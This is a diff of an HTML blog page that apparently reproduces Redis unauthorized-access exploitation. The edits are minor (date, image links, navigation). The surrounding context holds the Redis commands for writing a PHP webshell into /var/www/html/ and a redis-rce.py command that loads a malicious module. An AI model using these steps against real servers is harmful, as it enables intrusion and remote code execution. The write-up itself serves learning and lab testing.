@@ -242,7 +242,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2023-5-11<span class="bull">
+        2023-6-11<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -312,7 +312,7 @@ protected-mode no
 </li>
 <li><p>启动服务(redis-server)<br>启动redis服务，注意关闭防火墙，Ubuntu除了iptables机制，还有ufw安全机制</p>
 <p><code>ufw staus</code>看是否关闭<br>启动服务</p>
-<p><img src="https://img2018.cnblogs.com/blog/1592114/201910/1592114-20191012203213483-1785541353.png" alt="img"></p>
+<p><img src="https://baicany.github.io/images/1592114-20191012203213483-1785541353.png" alt="img"></p>
 </li>
 </ol>
 <p>kali安装redis</p>
@@ -321,7 +321,7 @@ protected-mode no
 </li>
 <li><p>解压,编译(跟什么一样)</p>
 </li>
-<li><p>测试是否能连接<br><img src="https://img2018.cnblogs.com/blog/1592114/201910/1592114-20191012203316598-1153965360.png" alt="img"></p>
+<li><p>测试是否能连接<br><img src="https://baicany.github.io/images/1592114-20191012203316598-1153965360.png" alt="img"></p>
 </li>
 </ol>
 <p>​        这里连接后发现输入info报错</p>
@@ -334,7 +334,7 @@ OK
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>测试目标靶机是否存在未授权访问</p>
 <p><img src="https://baicany.github.io/images/image-20230608112133014.png" alt="image-20230608112133014"></p>
 <h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><p>利用条件:目标开启了web服务器,并且知道web路径(可以利用phpinfo或者错误暴路径等)，还需要具有读写增删改查权限</p>
-<p><img src="https://img2018.cnblogs.com/blog/1592114/201910/1592114-20191012203436012-1515179378.png" alt="img"></p>
+<p><img src="https://baicany.github.io/images/1592114-20191012203436012-1515179378.png" alt="img"></p>
 <pre><code>config get dir 
 config set dir /var/www/html/
 config set dbfilename shell.php
@@ -414,7 +414,7 @@ save
 <p><code>git clone https://github.com/Ridter/redis-rce</code></p>
 <p>将第一步的module.so反正攻击目录下</p>
 </li>
-<li><p>第三步直接用脚本<br><code>python redis-rce.py -r 127.0.0.1 -p 6307 -L 127.0.0.1 -f module.so</code><br><img src="C:\Users\qwe\AppData\Roaming\Typora\typora-user-images\image-20230612165455249.png" alt="image-20230612165455249"></p>
+<li><p>第三步直接用脚本<br><code>python redis-rce.py -r 127.0.0.1 -p 6307 -L 127.0.0.1 -f module.so</code><br><img src="https://baicany.github.io/images/image-20230612165455249.png" alt="image-20230612165455249"></p>
 <p>按i进入交互式输入命令就行，重要是理解原理</p>
 <p><strong>Redis主从复制手动挡</strong></p>
 <p>1.使用脚本，监听本地端口1234，加载exp.so。</p>
@@ -490,36 +490,19 @@ rename-command EVAL     &quot;&quot;
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2023/06/01/java%E5%A4%8D%E4%B9%A0%E9%A2%98/" rel="prev">
-              <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://baicany.github.io/images/s15.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://baicany.github.io/images/s15.png">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                java复习题</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2023/05/11/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" rel="next">
+            <a href="/2023/06/03/python_debug_pin/" rel="next">
               <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://baicany.github.io/images/s4.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://baicany.github.io/images/s4.png">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://baicany.github.io/images/3687.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://baicany.github.io/images/3687.jpg">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                这是我的第一篇文章</h3>
+                flask_debug_pin</h3>
                 <hr>
               </div>
             </a>
